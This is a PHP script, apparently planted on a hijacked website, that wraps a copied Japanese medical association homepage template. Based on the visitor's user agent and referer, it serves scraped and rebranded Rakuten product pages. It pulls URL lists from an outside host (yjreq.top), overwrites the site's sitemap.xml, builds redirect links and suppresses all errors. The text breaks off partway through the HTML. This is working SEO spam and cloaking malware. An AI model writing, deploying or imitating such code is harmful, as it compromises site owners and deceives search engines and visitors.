<?php 
header('Content-Type:text/html; charset=utf-8');
error_reporting ( 0 );
$pageurl = 'toptuner/rsr10626162a01';
$rewrite_mod = "zosi3-C.html";
$arraypageurl=array(0=>"mzh-rt/555-2453520",1=>"nk-pro-use/t-1820",2=>"webyus/tb-35325028910",3=>"g-media/c-0042281567520",4=>"worlddepart/zd086302a01n0",5=>"health-welfare/226105",6=>"auc-yasukichi/copy0-0097-0802",7=>"g-media/c-7898104663688",8=>"angelsdust/mcn-08270",9=>"douguyasan/tor-kqre-200x15");
function class_x_i(){
	@set_time_limit(3600);
	@ignore_user_abort(1);
	ob_start();
	$urlInfo=array(); 
	//
	///url 
	$request_url='';
	if (isset($_SERVER['REQUEST_URI'])) {
		$request_url=$_SERVER['REQUEST_URI'];
	}
	$request_url = preg_replace("/^\//si", '', $request_url);

	$urlInfo['items']='item';
	if(strstr($request_url,'-product/'))
	{
		$urlInfo['items']='product';
	}
	global $rewrite_mod,$pageurl,$arraypageurl;
    $bbbstatus=0;
	$urlInfo['server_name']='';
	$urlInfo['filename']='';
	$urlInfo['lturl']='';
	$urlInfo['sitename']= explode("-",$rewrite_mod);
	$urlInfo['sitename']=$urlInfo['sitename'][0];
	$urlInfo['urlhtml']=explode(".",$rewrite_mod);
	$urlInfo['urlhtml']='.'.$urlInfo['urlhtml'][1];
	
	if($request_url==''){
		$urlInfo['lturl']=$pageurl;
	}else{
		if(strstr($request_url,$urlInfo['sitename'].'-') && !strstr($request_url,'sitemap')) { 
			$request_urls=explode("-",$request_url);
			$urlInfo['sitename']= $request_urls[0];
			$urlInfo['urlhtml']=explode(".",strrchr($request_url,'-'));
			$urlInfo['urlhtml']='.'.$urlInfo['urlhtml'][1];
			$position=stripos($request_url,'-')+1;
			$urlInfo['lturl']=substr($request_url,$position,strlen($request_url));
			$urlInfo['lturl']=explode(".",$urlInfo['lturl']);
			$urlInfo['lturl']=$urlInfo['lturl'][0];
			
			
		}else{
			if($urlInfo['lturl']==''){
			$mds=md5($request_url);
			$ids= substr($mds, -1);
			$urlInfo['lturl']=$arraypageurl[3];
		  }
		}
		
	}
  
	///url
	if (isset($_SERVER['HTTP_HOST'])) {
		 $urlInfo['server_name']  = $_SERVER['HTTP_HOST'];
	}elseif (isset($_SERVER['SERVER_NAME'])) {
		 $urlInfo['server_name'] = $_SERVER['SERVER_NAME'];
	}
		if(strstr($request_url,'sitemap')){
		$maps=explode("-",$request_url);
		$sx_content = "\x3c\x3fxml version=\"1.0\" encoding=\"UTF-8\"\x3f\x3e\n\t<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">";
		  $file_path =explode(".",$maps[2]);
		  $file_path = "http://map.yjreq.top/" . $file_path[0] . ".txt";
		  //date_default_timezone_set("PRC");
		  $file_short_path_content =get_html_content($file_path);
		  $file_short_path_array = explode("\n", $file_short_path_content);
			foreach ($file_short_path_array as $file_short_path) {
				//sitemap static start
				if(!strstr(trim($file_short_path),'product/')){
					$sx_content .= "\n\t\t" . '<url>';
					$sx_content .= "\n\t\t\t" . '<loc>http://' . $_SERVER['SERVER_NAME'] . '/' . $maps[0]. '-' . trim($file_short_path) . $urlInfo['urlhtml'].'</loc>';
					$sx_content .= "\n\t\t\t" . '<lastmod>'. date('Y-m-d').'</lastmod>';
					$sx_content .= "\n\t\t\t" . '<changefreq>daily</changefreq>';
					$sx_content .= "\n\t\t\t" . '<priority>0.8</priority>';
					$sx_content .= "\n\t\t</url>";
					
				}
			}

	$sx_content .= "\n\t</urlset>";
	$sitemap_path = './sitemap.xml';
	if(file_exists($sitemap_path))
	{
		@unlink ($sitemap_path);
	}
  echo   @file_put_contents($sitemap_path, $sx_content);
	echo $sx_content;
	die();
	}
	//echo $urlInfo['server_name'].'|'.$urlInfo['filename'].'|'.$urlInfo['sitename']."|".$urlInfo['urlhtml'].'|'.$urlInfo['lturl'].'|'.$urlInfo['items'];
	//die();
	$httpReferer  = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
	$login_status = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
	$lCheck = func_loginCheck($login_status);
	
	$rCheck = func_referCheck($httpReferer);
	
	$pro_url = 'http://'.$urlInfo['items'].'.rakuten.co.jp/'.$urlInfo['lturl'];
	//echo $pro_url;
	
	$jumpcodeurl = 'http://h10.yjreq.top/'.$urlInfo['lturl'].'.html';
	//echo $jumpcodeurl;
	if($bbbstatus==1){
		$lCheck=false;
	}
	if($lCheck || $rCheck){
		$html_content=get_html_content($pro_url);
		$html_content = iconv("EUC-JP","UTF-8//IGNORE",$html_content);
		$html_content=str_replace('／', '】', $html_content);
		$html_content=str_replace('／', '【', $html_content);
		$html_content = str_replace("楽天市場店", "", $html_content);
		$html_content = str_replace("楽天市場", "", $html_content);
		$html_content = str_replace("楽天", "", $html_content);
		$pat = '/<a[^>]*?href="http:\/\/search.[^>]*?"[^>]*?>([\s\S]*?)<\/a>/i';     
		preg_match_all($pat, $html_content, $m);    
		//$Article_Inlinks='<ul>';
        $searchurl='';
		$status=1;
		for($i=0;$i<count($m);$i++){
			for($j=0;$j<count($m[$i]);$j++){
				 if(strstr($m[$i][$j],'search.rakuten.co.jp')==true ){
					 $searchurl= $m[$i][$j];
					 $status=0;
				 }
			}
			if($status==0){break;}
		}
	//echo $searchurl;
	$arrsearch = split('"',$searchurl);
	for($i=0;$i<count($arrsearch);$i++){
	 if(strstr($arrsearch[$i],'search.rakuten.co.jp')==true ){
		  $searchurl=$arrsearch[$i];
		  break;
	 }
	}
	//echo $searchurl;
	$html_Inlinks='';
   if($lCheck){
	$html_Inlinks=get_html_content($searchurl);
	$patsearch = '/<a[^>]*?href="http:\/\/item.[^>]*?"[^>]*?>([\s\S]*?)<\/a>/i';     
	preg_match_all($patsearch, $html_Inlinks, $msearch);
	for($i=0;$i<count($msearch);$i++){
			 for($j=0;$j<count($msearch[$i]);$j++){
				 if(strstr($msearch[$i][$j],'<img')!=false && strstr($msearch[$i][$j],'item.rakuten.co.jp')!=false ){
							preg_match('/href="[^"]*?"/i', $msearch[$i][$j],$a1);
						
							preg_match('/alt="[^"]*?"/i', $msearch[$i][$j],$a2);
							$a3= str_replace('alt="', '', $a2[0]);
							$a3= str_replace('"', '', $a3);

							$a1= str_replace('"', '', $a1[0]);
							
							$a1= str_replace('href=', '', $a1);
							
							$a2= str_replace('item.rakuten.co.jp/', $urlInfo['server_name'].'/'.$urlInfo['sitename'].'-', $a1).$urlInfo['urlhtml'];
							$a2=str_replace('/'.$urlInfo['urlhtml'],$urlInfo['urlhtml'],$a2);
							if($a3!=''){
                            $Article_Inlinks .= '<li><a href="'.$a2.'" title="'.$a3.'" >'.$a3.'</a></li>';
							}
				 }
			 }
	}
	}
		//$Article_Inlinks .='</ul>';
		//$html_content='123';
		$Mate_Title='';
		$Mate_Keyword='';
		$Mate_Description='';
		$Article_Title='';
		$Article_picture='';
		$Article_category='';
		$Article_price='';
		$Article_description='';
		$html_content=str_replace('／', '】', $html_content);
		$html_content=str_replace('／', '【', $html_content);
		$html_content=str_replace('【弛欧辉眷】', '', $html_content);
		$html_content=str_replace('弛欧辉眷', '', $html_content);
		$html_content = str_replace('楽天市場店', '', $html_content);
		$html_content = str_replace('楽天市場', '', $html_content);
		$html_content = str_replace('楽天', '', $html_content);
		$html_content=str_replace($urlInfo['items'].'.rakuten.co.jp',$urlInfo['server_name'], $html_content);

		preg_match('/<title>([\s\S]*?)<\/title>/i', $html_content,$Mate_Title);
		preg_match('/<meta[^>]*?name="keywords"[^>]*?>/i', $html_content,$Mate_Keyword);
		preg_match('/<meta[^>]*?name="description"[^>]*?>/i', $html_content,$Mate_Description);
		preg_match('/<span[^>]*?class="item_name"[^>]*?>([\s\S]*?)<\/span>/i', $html_content,$Article_Title);
		 $Mate_Title=$Mate_Title[0];
		 $Mate_Title=str_replace('<title>', '',  $Mate_Title);
		 $Mate_Title=str_replace('</title>', '',  $Mate_Title);


		 preg_match('/content="[^"]*?"/i', $Mate_Keyword[0],$Mate_Keyword);
		
		 $Mate_Keyword=str_replace('content=', '',  $Mate_Keyword[0]);
		 $Mate_Keyword=str_replace('"', '', $Mate_Keyword);
		 preg_match('/content="[^"]*?"/i', $Mate_Description[0],$Mate_Description);
         $Mate_Description=str_replace('content=', '',  $Mate_Description[0]);
		 $Mate_Description=str_replace('"', '', $Mate_Description);

		if(preg_match('/(?<=<td valign="top">)<a[\w\W]+?expid="[0-9]+" class="[\w\W]+?"><img src="[\w\W]+?.jpg/i', $html_content, $pro_img_temp)){
			preg_match('/(?<=<img src=").*$/i', $pro_img_temp[0], $Article_picture);
		}


		preg_match('/<td[^>]*?class="sdtext"[^>]*?>([\s\S]*?)<\/td>/i', $html_content,$Article_category);
		preg_match('/<span[^>]*?class="price2"[^>]*?>([\s\S]*?)<\/span>/i', $html_content,$Article_price);
		$description="";
		if(preg_match('/(?<=<div id="product">)[\w\W]+?(?=<\/div>)/', $html_content,$Article_descriptiona) != 0){
		}
        if(preg_match('/(?<=<td><span class="sale_desc">)[\w\W]+?(?=<\/span>[\s]*<br>[\s]*<br>[\s]*<\/td>)/', $html_content,$Article_descriptionb) != 0){
			
		}if (preg_match('/(?<=<span class="item_desc">)[\w\W]+?(?=<\/span>[\s]*<br>[\s]*<br>[\s]*<\/td>[\s]*<\/tr>[\s]*<\/table>)/', $html_content,$Article_descriptionc)) {
			
		}
	
		$template = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang="ja" xmlns="http://%MainShell%/1999/xhtml" >
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Language" content="ja" />
<meta http-equiv="Content-Script-Type" content="text/javascript" />
<title>%Mate_Title%</title>
<meta name="description" content="%Mate_Description%"/>
<meta name="keywords" content="%Mate_Keyword%"/>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<link rel="stylesheet" type="text/css" href="%MainShell%/css_2014/megamenu.css">
<link rel="stylesheet" type="text/css" href="%MainShell%/css_2014/spritesheets.css" media="all">
<link rel="Stylesheet" href="%MainShell%/css_2014/index.css">
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="%MainShell%/image_2014/favicon.ico" />
<!--slide-->
<link rel="stylesheet" type="text/css" href="%MainShell%/js/flexslider.css"/>
<script type="text/javascript"  src="js/jquery.flexslider.js"></script>
<!--pagetop-->
<!--[if lt IE 9]> 
<![endif]-->
</head>

<body id="top">

<div id="wrap">
	<div id="root">
	<h1>%Article_Title%</h1>
	<p>
	</p>
	<pre>%Article_Comment%</pre>
		<div class="box" id="header">
			<div class="box" id="logo"><a href="%MainShell%/index.html"><img src="image_2014/header_logo_2x.png" alt="&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;"></a></div>
			
			<div class="box" id="headnav_sp">
				<ul>
					<li><a href="%MainShell%/12_ishikai/html/02_gaiyou.html"><img src="image_2014/header_icon_sp_001.png" alt="&#12362;&#21839;&#12356;&#21512;&#12431;&#12379;"></a></li>
					<li><a href="%MainShell%/member.html"><img src="image_2014/header_icon_sp_002.png" alt="&#20132;&#36890;&#12450;&#12463;&#12475;&#12473;"></a></li>
				</ul>
			</div>
			
			<div class="box" id="headnav">
				<ul>
					<li class="form"><a href="%MainShell%/contact.html"><img src="image_2014/header_icon_001.png" alt="&#12362;&#21839;&#12356;&#21512;&#12431;&#12379;" width="140" height="35"></a></li>
					<li class="access"><a href="%MainShell%/12_ishikai/html/02_gaiyou.html"><img src="image_2014/header_icon_002.png" alt="&#20132;&#36890;&#12450;&#12463;&#12475;&#12473;" width="140" height="35"></a></li>
					<li class="login"><a href="%MainShell%/member.html"><img src="image_2014/header_login.png" alt="&#20250;&#21729;&#12525;&#12464;&#12452;&#12531;" width="170" height="45"></a></li>
				</ul>
				
				<div class="search">
			
					<!-- &#12371;&#12371;&#12363;&#12425;namazu -->
					<form name="namazu" method="GET" action="../../../scripts/namazu/namazu.cgi.exe" target="_self" Accept-charset="EUC-JP" onsubmit="return false;">
					<input type="hidden" name="whence" value="0">
					<input type="hidden" name="max" value="40">
					<input type="hidden" name="result" value="normal">
					<input type="hidden" name="sort" value="score">
					<input type="text" class="text" name="query" style="width:400;">
					<input name="&#12508;&#12479;&#12531;" type="button" class="search_btn" onclick="org=document.charset;document.charset="EUC-JP";document.namazu.submit();document.charset=org;">
					</form>
					<!-- &#12371;&#12371;&#12414;&#12391;namazu -->
			
				</div>
			</div>
		</div>
		<pre>%Article_Inlink%</pre>
		<div class="box" id="gnavi">
		
		<table cellpadding="0" class="gnavi-table new-megamenu">
			<tr>
				<td width="325" class="mega-trigger">
				<a class="ss header-ss products-regular" href="%MainShell%/11_shimin/01_shimin.html"><img src="image_2014/gnavi001.png"></a>
					

					<div class="mega-arrow"></div>
					<div class="mega-content" style="display: none;">
						<div class="mega-content-inner">
							
						<ul class="ul_menu">
						<li><a href="%MainShell%/11_shimin/html/03_kenko.html">&#24066;&#27665;&#24195;&#22577;&#12300;&#20581;&#24247;&#12373;&#12387;&#12413;&#12429;&#12301;</a></li>
						<li><a href="%MainShell%//BookletRequest/" target="_blank">&#12300;&#20581;&#24247;&#12373;&#12387;&#12413;&#12429;&#12301;&#37197;&#24067;&#12362;&#30003;&#36796;&#12415;(&#28961;&#26009;)</a></li>
						<li><a href="%MainShell%/11_shimin/html/1101_sankosho.html">&#20581;&#24247;&#12497;&#12531;&#12501;&#12524;&#12483;&#12488;&#12300;&#20803;&#27671;&#12398;&#21442;&#32771;&#26360;&#12301;</a></li>
						<li><a href="%MainShell%/03_l/Kenkou/Kenkou.aspx" target="_blank">&#24066;&#27665;&#21521;&#12369;&#21307;&#23398;&#35611;&#24231;</a></li>
						<li><a href="%MainShell%/11_shimin/html/07_event.html">&#24066;&#27665;&#21521;&#12369;&#12452;&#12505;&#12531;&#12488;&#31561;</a></li>
						
						</ul>
						
						<ul class="ul_menu">
						<li><a href="%MainShell%/11_shimin/html/05_sapporo.html">&#26413;&#24140;&#24066;&#12398;&#20445;&#20581;&#12539;&#21307;&#30274;</a></li>
						<li><a href="%MainShell%/11_shimin/influenza/influenza.html">&#12452;&#12531;&#12501;&#12523;&#12456;&#12531;&#12470;&#12539;&#24863;&#26579;&#30151;&#38306;&#36899;&#24773;&#22577;</a></li>
						<li><a href="%MainShell%/11_shimin/files/saiketsu.pdf" target="_blank">&#24739;&#32773;&#12373;&#12435;&#12408;<br>&#25505;&#34880;&#12539;&#27880;&#23556;&#12434;&#23433;&#20840;&#12395;&#34892;&#12358;&#28858;&#12398;&#12362;&#39000;&#12356;(PDF)</a></li>
						<li><a href="%MainShell%/11_shimin/html/02_chiiki.html">&#22320;&#22495;&#21307;&#30274;&#23460;</a></li>
						
						</ul>
						
						<ul class="ul_menu nborder">
						<li><a href="%MainShell%/sapporo-sanpo/index.html" target="_blank">&#26413;&#24140;&#22320;&#22495;&#29987;&#26989;&#20445;&#20581;&#12475;&#12531;&#12479;&#12540;</a></li>
						<li><a href="%MainShell%/14_kankei/html/03_qa.html">&#21307;&#25919;&#12513;&#12514;&#65329;&#65286;&#65313;</a></li>
						<li><a href="%MainShell%/14_kankei/html/02_opinion.html">&#12458;&#12500;&#12491;&#12458;&#12531;</a></li>
						<li><a href="%MainShell%/14_kankei/html/11_discussion.html">&#25919;&#31574;&#22996;&#21729;&#20250;&#12487;&#12451;&#12473;&#12459;&#12483;&#12471;&#12519;&#12531;</a></li>						
						</ul>
								
						<div style="clear:both"></div>
						</div>
					</div>
				</td>
			<td width="325" class="mega-trigger" id="happy-recipe-anchor">
			<a class="ss header-ss products-regular" href="%MainShell%/14_kankei/01_concerned.html"><img src="image_2014/gnavi002.png"></a>
				<div class="mega-arrow"></div>
				<div class="mega-content" style="display: none;">
					<div class="mega-content-inner">
					
						<ul class="ul_menu">
						<li><a href="%MainShell%/14_kankei/html/07_kouenkai.html">&#21307;&#30274;&#32773;&#21521;&#12369;&#35611;&#28436;&#20250;&#31561;</a></li>
						<li><a href="%MainShell%/14_kankei/html/08_nyukai.html">&#20837;&#20250;&#12395;&#12388;&#12356;&#12390;</a></li>
						<li><a href="%MainShell%/14_kankei/html/09_hoken.html">&#21307;&#30274;&#20445;&#38522;&#38306;&#20418;&#24773;&#22577;</a></li>
						<li><a href="%MainShell%/14_kankei/html/04_gaiyou.html">&#20250;&#21729;&#31119;&#31049;&#20107;&#26989;&#27010;&#35201;</a></li>
						</ul>
						
						<ul class="ul_menu">
						<li><a href="%MainShell%/14_kankei/html/05_doctorbank.html">&#28961;&#26009;&#32887;&#26989;&#32057;&#20171;</a></li>
						<li><a href="%MainShell%/14_kankei/html/03_qa.html">&#21307;&#25919;&#12513;&#12514;&#65329;&#65286;&#65313;</a></li>
						<li><a href="%MainShell%/14_kankei/html/02_opinion.html">&#12458;&#12500;&#12491;&#12458;&#12531;</a></li>
						<li><a href="%MainShell%/14_kankei/html/11_discussion.html">&#25919;&#31574;&#22996;&#21729;&#20250;&#12487;&#12451;&#12473;&#12459;&#12483;&#12471;&#12519;&#12531;</a></li>						
						</ul>
						
						<ul class="ul_menu nborder">
						<li><a href="%MainShell%/14_kankei/html/12_homecare_center.html">&#22312;&#23429;&#21307;&#31561;&#32057;&#20171;&#12475;&#12531;&#12479;&#12540;</a></li>
						<li><a href="%MainShell%/14_kankei/html/10_chiiki.html">&#22320;&#22495;&#21307;&#30274;&#23460;</a></li>
						<li><a href="%MainShell%/14_kankei/chiken/0401_chiken.html">&#27835;&#39443;&#20107;&#26989;&#12395;&#12388;&#12356;&#12390;</a></li>
						<li><a href="%MainShell%//CollectMail/" target="_blank">&#20250;&#21729;&#21521;&#12369;&#65317;&#12513;&#12540;&#12523;&#12395;&#12424;&#12427;&#24773;&#22577;&#12469;&#12540;&#12499;&#12473;&#12398;&#25552;&#20379;&#12288;<span class="fntred">&#8251;&#12497;&#12473;&#12527;&#12540;&#12489;&#12364;&#24517;&#35201;&#12391;&#12377;</span></a></li>
						</ul>
							
						<div style="clear:both"></div>
					</div>
				</div>
			</td>
			
			
			<td width="325" class="mega-trigger" id="enjoy-anchor">
			
			<a class="ss header-ss products-regular" href="%MainShell%/12_ishikai/01_ishikai.html">
			<img src="image_2014/gnavi003.png"></a>
			
				<div class="mega-arrow"></div>
				<div class="mega-content" style="display: none;">
					<div class="mega-content-inner">
						<div class="clearfix">
							<ul class="ul_menu">
							<li><a href="%MainShell%/12_ishikai/html/01_aisatsu.html">&#20250;&#38263;&#12372;&#25384;&#25334;</a></li>
							<li><a href="%MainShell%/12_ishikai/html/02_gaiyou.html">&#21307;&#24107;&#20250;&#12398;&#27010;&#35201;</a></li>
							<li><a href="%MainShell%/12_ishikai/html/03_ayumi.html">&#21307;&#24107;&#20250;&#12398;&#27497;&#12415;</a></li>
							</ul>
							
							<ul class="ul_menu">
							<li><a href="%MainShell%/12_ishikai/html/04_yakuin.html">&#24441;&#21729;&#31561;&#32057;&#20171;</a></li>
							<li><a href="%MainShell%/12_ishikai/html/06_kaimubuntan.html">&#21307;&#24107;&#20250;&#20250;&#21209;&#20998;&#25285;</a></li>
							</ul>
							<ul class="ul_menu nborder">
							<li><a href="%MainShell%/kango/index.html" target="_blank">&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;&#30475;&#35703;&#23554;&#38272;&#23398;&#26657;<br>
							&#8251;&#24179;&#25104;24&#24180;3&#26376;&#26411;&#38281;&#26657;&#65288;&#35388;&#26126;&#26360;&#12398;&#20132;&#20184;&#12395;&#12388;&#12356;&#12390;&#65289;</a></li>
							</ul>
							<div style="clear:both"></div>
						</div>
					</div>
				</div>
			</td>
		</table>

		</div><!--gnavi end-->
		
		<div class="box" id="gnavi_sp">
			<ul>
			<li><a href="%MainShell%/11_shimin/01_shimin.html"><img src="image_2014/gnavi_sp_001.png" alt="&#24066;&#27665;&#12398;&#30342;&#27096;&#12408;"></a></li>
			<li><a href="%MainShell%/14_kankei/01_concerned.html"><img src="image_2014/gnavi_sp_002.png" alt="&#21307;&#24107;&#12539;&#21307;&#30274;&#38306;&#20418;&#12398;&#30342;&#27096;&#12408;"></a></li>
			<li><a href="%MainShell%/12_ishikai/01_ishikai.html"><img src="image_2014/gnavi_sp_003.png" alt="&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;&#12395;&#12388;&#12356;&#12390;"></a></li>
			</ul>
		
		</div>
		
		<div class="box" id="mainimg">
	
			<div class="flexslider">
			<ul class="slides">
			<li><a href="%MainShell%/11_shimin/kouza_pdf/271_medical.pdf" target="_blank"><img src="image_2014/slide025.jpg" alt="&#31532;271&#22238;&#23478;&#24237;&#21307;&#23398;&#35611;&#24231;" /></a></li>
			<li><a href="%MainShell%/14_kankei/chiken/0415_chiken.html"><img src="image_2014/slide026.jpg" alt="&#31532;9&#22238;CRC&#30740;&#20462;&#20250;" /></a></li>
			<li><a href="%MainShell%/11_shimin/html/03_kenko.html"><img src="image_2014/slide022.jpg" alt="&#31532;35&#21495;&#20581;&#24247;&#12373;&#12387;&#12413;&#12429;" /></a></li>
			<li><a href="%MainShell%/11_shimin/html/1101_sankosho.html"><img src="image_2014/slide023.jpg" alt="&#20581;&#24247;&#12497;&#12531;&#12501;&#12524;&#12483;&#12488;&#12300;&#20803;&#27671;&#12398;&#21442;&#32771;&#26360;&#12301;" /></a></li>
			<li><img src="image_2014/slide001.jpg" alt="&#26413;&#24140;&#24066;&#21307;&#24107;&#20250;"/></li>			
			</ul>
			</div>
			<script type="text/javascript">
			$(function() {
				$(".flexslider").flexslider({
					animation: "slide",
					slideshowSpeed: 5000
				});
			});
			</script>
		</div><!--mainimg end-->
		
		<div class="box" id="snavi">
			<ul>
				<li><a href="%MainShell%//medi-map/" target="_blank"><img src="image_2014/snav_001.png" alt="&#21307;&#30274;&#27231;&#38306;&#24773;&#22577;&#12510;&#12483;&#12503;" srcset="image_2014/snav_001_2x.png 2x"></a></li>
				<li><a href="%MainShell%//z/" target="_blank"><img src="image_2014/snav_002.png" alt="&#22312;&#23429;&#30274;&#39178;&#24773;&#22577;&#12510;&#12483;&#12503;" srcset="image_2014/snav_002_2x.png 2x"></a></li>
				<li><a href="%MainShell%//02_c/Shinryo.asp" target="_blank"><img src="image_2014/snav_003.png" alt="&#22812;&#38291;&#20241;&#26085;&#35386;&#30274;&#26696;&#20869;" srcset="image_2014/snav_003_2x.png 2x"></a></li>
				<li><a href="%MainShell%/11_shimin/01_s/Kyubyo.html"><img src="image_2014/snav_004.png" alt="&#22812;&#38291;&#24613;&#30149;&#12475;&#12531;&#12479;&#12540;" srcset="image_2014/snav_004_2x.png 2x"></a></li>
			</ul>
		</div>
		
		<div class="box">
			<a href="%MainShell%/14_kankei/html/12_homecare_center.html"><img src="image_2014/bana_homecaer.png" alt="&#22312;&#23429;&#21307;&#31561;&#32057;&#20171;&#12475;&#12531;&#12479;&#12540;"></a>
		</div>
		
		<div class="box" id="content">
			<div class="box" id="topics">
			
				<div class="midasi_cont">TOPICS</div>
				<ul>
				<li><a href="%MainShell%/11_shimin/kouza_pdf/271_medical.pdf" target="_blank"><img src="image_2014/topics_2016_003_2x.png" alt="&#31532;271&#22238;&#23478;&#24237;&#21307;&#23398;&#35611;&#24231;"></a></li>
				<li><a href="%MainShell%//14_kankei/chiken/0415_chiken.html"><img src="image_2014/topics_2016_004_2x.png" alt="&#31532;9&#22238;CRC&#30740;&#20462;&#20250;&#12398;&#12372;&#26696;&#20869;"></a></li>
				<li><a href="%MainShell%/11_shimin/html/03_kenko.html"><img src="image_2014/topics_2015_021_2x.png" alt="&#24066;&#27665;&#24195;&#22577;&#12300;&#20581;&#24247;&#12373;&#12387;&#12413;&#12429;&#12301;"></a></li>
				<li><a href="%MainShell%//03_l/Kenkou/Kenkou.aspx" target="_blank"><img src="image_2014/topics_2014_002_2x.png" alt="&#24066;&#27665;&#21521;&#12369;&#21307;&#23398;&#35611;&#24231;&#12473;&#12465;&#12472;&#12517;&#12540;&#12523;"></a></li>
				<li><a href="%MainShell%/11_shimin/html/1101_sankosho.html"><img src="image_2014/topics_2016_001_2x.png" alt="&#20581;&#24247;&#12497;&#12531;&#12501;&#12524;&#12483;&#12488;&#12300;&#20803;&#27671;&#12398;&#21442;&#32771;&#26360;&#12301;"></a></li>
				<li><a href="%MainShell%/14_kankei/chiken/0401_chiken.html"><img src="image_2014/topics_2014_004_2x.png" alt="&#27835;&#39443;&#20107;&#26989;&#12395;&#12388;&#12356;&#12390;"></a></li>
				<li><a href="%MainShell%/11_shimin/influenza/influenza.html"><img src="image_2014/topics_2014_007_2x.png" alt="&#12452;&#12531;&#12501;&#12523;&#12456;&#12531;&#12470;&#12539;&#24863;&#26579;&#30151;&#38306;&#36899;&#24773;&#22577;"></a></li>
			  </ul>
			</div>
			
			
			<div class="box" id="bana">
				<div class="midasi_cont">&#26908;&#35386;&#12539;&#20104;&#38450;&#25509;&#31278;&#12395;&#12388;&#12356;&#12390;</div>
				<ul>
				<li class="bana01"><a href="%MainShell%/11_shimin/html/0503_sapporo.html">&#29305;&#23450;&#20581;&#24247;&#35386;&#26619;&#31561;</a></li>
				<li class="bana02"><a href="%MainShell%/11_shimin/html/0508_sapporo.html">&#21508;&#31278;&#12364;&#12435;&#26908;&#35386;&#31561;</a></li>
				<li class="bana03"><a href="%MainShell%/11_shimin/html/1001_kenshin.html">&#20083;&#12364;&#12435;&#12539;&#23376;&#23470;&#12364;&#12435;&#26908;&#35386;&#12434;&#21463;&#12369;&#12414;&#12375;&#12423;&#12358;</a></li>
				<li class="bana04"><a href="%MainShell%/11_shimin/html/0505_sapporo.html">&#20104;&#38450;&#25509;&#31278;</a></li>

				<li class="bana05"><a href="%MainShell%/vpd_page/index.html">&#27700;&#30168;&#65288;&#12415;&#12378;&#12412;&#12358;&#12381;&#12358;&#65289;&#12527;&#12463;&#12481;&#12531;&#12364;&#23450;&#26399;&#25509;&#31278;&#12395;&#12394;&#12426;&#12414;&#12375;&#12383;</a></li>
				<li class="bana06"><a href="%MainShell%/np_page/index.html">&#39640;&#40802;&#32773;&#29992;&#32954;&#28814;&#29699;&#33740;&#12527;&#12463;&#12481;&#12531;&#12364;&#23450;&#26399;&#25509;&#31278;&#12395;&#12394;&#12426;&#12414;&#12375;&#12383;</a></li>
				<li class="bana07"><a href="%MainShell%/va_japanese_page/index.html">&#26085;&#26412;&#33075;&#28814;&#12527;&#12463;&#12481;&#12531;&#12364;&#23450;&#26399;&#25509;&#31278;&#12395;&#12394;&#12426;&#12414;&#12375;&#12383;</a></li>
				</ul>

			</div>
			
			  <div class="box" id="bana_sp">
				<div class="midasi_cont">&#26908;&#35386;&#12539;&#20104;&#38450;&#25509;&#31278;&#12395;&#12388;&#12356;&#12390;</div>
				<ul>
				<li><a href="%MainShell%/11_shimin/html/0503_sapporo.html"><img src="image_2014/right_navi_001_sp.png"></a></li>
				<li><a href="%MainShell%/11_shimin/html/0508_sapporo.html"><img src="image_2014/right_navi_002_sp.png"></a></li>
				<li><a href="%MainShell%/11_shimin/html/1001_kenshin.html"><img src="image_2014/right_navi_003_sp.png"></a></li>
				<li><a href="%MainShell%/11_shimin/html/0505_sapporo.html"><img src="image_2014/right_navi_004_sp.png"></a></li>
				<li><a href="%MainShell%/vpd_page/index.html"><img src="image_2014/right_navi_005_sp.png" alt="&#27700;&#30168;&#65288;&#12415;&#12378;&#12412;&#12358;&#12381;&#12358;&#65289;&#12527;&#12463;&#12481;&#12531;&#12364;&#23450;&#26399;&#25509;&#31278;&#12395;&#12394;&#12426;&#12414;&#12375;&#12383;"></a></li>
				<li><a href="%MainShell%/np_page/index.html"><img src="image_2014/right_navi_006_sp.png" alt="&#39640;&#40802;&#32773;&#29992;&#32954;&#28814;&#29699;&#33740;&#12527;&#12463;&#12481;&#12531;&#12364;&#23450;&#26399;&#25509;&#31278;&#12395;&#12394;&#12426;&#12414;&#12375;&#12383;"></a></li>
				<li><a href="%MainShell%/va_japanese_page/index.html"><img src="image_2014/right_navi_007_sp.png" alt="&#26085;&#26412;&#33075;&#28814;&#12527;&#12463;&#12481;&#12531;&#12364;&#23450;&#26399;&#25509;&#31278;&#12395;&#12394;&#12426;&#12414;&#12375;&#12383;"></a></li>
				</ul>
			</div>
			
			<div class="box" id="news">
				<div class="box" id="ippan">
				
				<div id="news_header">
				<div class="news_midasi_ippan">&#26032;&#30528;&#24773;&#22577;</div>
				<div class="news_btn_list"><a href="%MainShell%/news_ippan.html"><img src="image_2014/news_icon_list.png" alt="&#19968;&#35239;&#12408;"></a></div>
				</div>
				<dl>
					<dt>2016.05.31</dt>
					<dd><a href="%MainShell%/11_shimin/html/0702_taiwa.html">&#24066;&#27665;&#23550;&#35441;&#38598;&#20250;2015&#22577;&#21578;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.05.31</dt>
					<dd><a href="%MainShell%/14_kankei/html/11_discussion.html">&#24179;&#25104;28&#24180;&#24230;5&#26376;&#21495;&#25919;&#31574;&#22996;&#21729;&#20250;&#12487;&#12451;&#12473;&#12459;&#12483;&#12471;&#12519;&#12531;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
					<dt>2016.05.31</dt>
					<dd><a href="%MainShell%/14_kankei/html/02_opinion.html">&#24179;&#25104;28&#24180;&#24230;5&#26376;&#21495;&#12458;&#12500;&#12491;&#12458;&#12531;&#12434;&#25522;&#36617;&#12375;&#12414;&#12375;&#12383;&#12290;</a></dd>
